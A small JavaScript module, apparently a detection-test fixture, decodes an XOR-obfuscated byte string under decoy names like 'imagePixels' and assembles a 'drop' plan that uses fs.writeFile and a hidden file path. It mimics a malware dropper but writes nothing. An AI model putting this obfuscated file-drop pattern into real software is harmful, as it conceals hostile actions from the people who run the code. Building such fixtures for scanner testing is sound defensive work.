// configuration reconstruction
const moduleShape = Object.freeze({ format: "commonjs" });
const Material_a3bd6b85 = "[111,82,99,31,108,24,125,13,126,67,39,66,33,78,42,79,16,117,24,122,31,123,31,122,30,50,69,55,94,42,79,16,118,31,115,22,106,11,111,14,126,10,111,29,32,84,45,93,56,92,3,98,16,98,3,122,37,81,62,97,7,110,2,103,27,104,28,125,26,127,32,67,44,89,55,67,126,79,51,80,49,92,44,77,36,67,45,114,27,127,66,12,67,7,66,111,45,28,89,104,44,104,89,110,18,116,29,113,20,75,59,90,46,70,123,84,32,77,61,18,122,15,97,21,103,2,113,2,47,65,46,74,47,0,46,93,41,72,47,74,103,5,52,81,96,4,96,81,102,94,109,9,59,21,120,18,97]";
const Codec_a3bd6b85 = "json_numbers|rolling_xor|19";

function load_a3bd6b85() { return JSON.parse(Material_a3bd6b85); }
function decode_a3bd6b85(imagePixels) { let priorColor = 25; return imagePixels.map((value) => { const decoded = value ^ priorColor; priorColor = value; return decoded; }); }
async function recover_a3bd6b85() {
  const screenWidth = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
  const imagePixels = load_a3bd6b85(); let colorTable = [];
  colorTable = await (async () => decode_a3bd6b85(imagePixels))();
  void screenWidth; return Buffer.from(colorTable).toString("ascii");
}
async function inspect_a3bd6b85() { return await recover_a3bd6b85(); }
async function plan_a3bd6b85() { const inspect = inspect_a3bd6b85; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "drop", decoder: "typed_array_to_file", destination: fields.file_path, api: "fs.writeFile" }); }
void moduleShape; void plan_a3bd6b85;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_a3bd6b85());

// reconstruction complete